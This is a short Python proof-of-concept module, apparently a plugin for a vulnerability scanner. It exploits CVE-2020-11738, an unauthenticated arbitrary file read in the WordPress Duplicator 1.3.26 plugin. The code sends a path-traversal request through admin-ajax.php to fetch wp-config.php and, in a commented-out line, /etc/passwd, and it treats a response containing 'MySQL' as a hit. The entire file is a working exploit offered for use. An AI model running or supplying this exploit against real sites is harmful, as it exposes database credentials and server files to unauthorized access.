# coding: utf-8
import requests
import random

#Wordpress Plugin Duplicator 1.3.26 - Unauthenticated Arbitrary File Read
def poc(url,user_agent,proxy):

    url = url.strip("/")
    #漏洞位置
    url=url+'/wp-admin/admin-ajax.php?action=duplicator_download&file='
    # 要读取的文件
    # file = '../../../../../../../../../../etc/passwd'
    file='../wp-config.php'
    url=url+file

    header = {'User-Agent': user_agent}
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = requests.get(url, headers=header, proxies=proxies)
    else:
        response = requests.get(url, headers=header)

    if response.status_code==200 and 'MySQL' in response.text:
        return 'Wordpress Plugin Duplicator 1.3.26 - 未经认证任意文件读取    漏洞编号：CVE-2020-11738'


def run(url,logindict,user_agent,proxies):
    result = poc(url,user_agent,proxies)
    return result

# run("http://192.168.220.128/Wordpress/wordpress-5.8.2-zh_CN/",{'admin':'admin'},'','')
